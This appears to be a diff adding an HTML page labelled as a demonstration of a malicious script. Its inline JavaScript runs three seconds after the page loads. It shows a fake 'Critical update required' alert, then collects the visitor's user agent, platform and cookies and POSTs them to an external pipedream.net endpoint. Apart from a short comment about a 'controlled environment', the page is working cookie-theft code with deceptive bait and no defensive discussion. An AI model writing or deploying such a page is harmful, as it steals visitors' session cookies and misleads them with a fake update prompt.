@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Demonstration of Malicious Script</title>
+</head>
+<body>
+    <h1>Welcome to the Website</h1>
+    <p>This page demonstrates how malicious scripts work in a controlled environment.</p>
+
+    <script>
+        // Simulated malicious script to extract user data
+        function stealBrowserData() {
+            // Collect browser info
+            const browserData = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                cookies: document.cookie,
+            };
+
+            // Send the stolen data to a malicious server
+            fetch('https://eonler3yutjyl18.m.pipedream.net', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(browserData),
+            }).catch((err) => console.error("Error sending stolen data:", err));
+        }
+
+        // Simulate triggering both file download and data theft
+        setTimeout(() => {
+            alert("Critical update required. File downloading...");
+            stealBrowserData();
+        }, 3000);
+    </script>
+</body>
+</html>
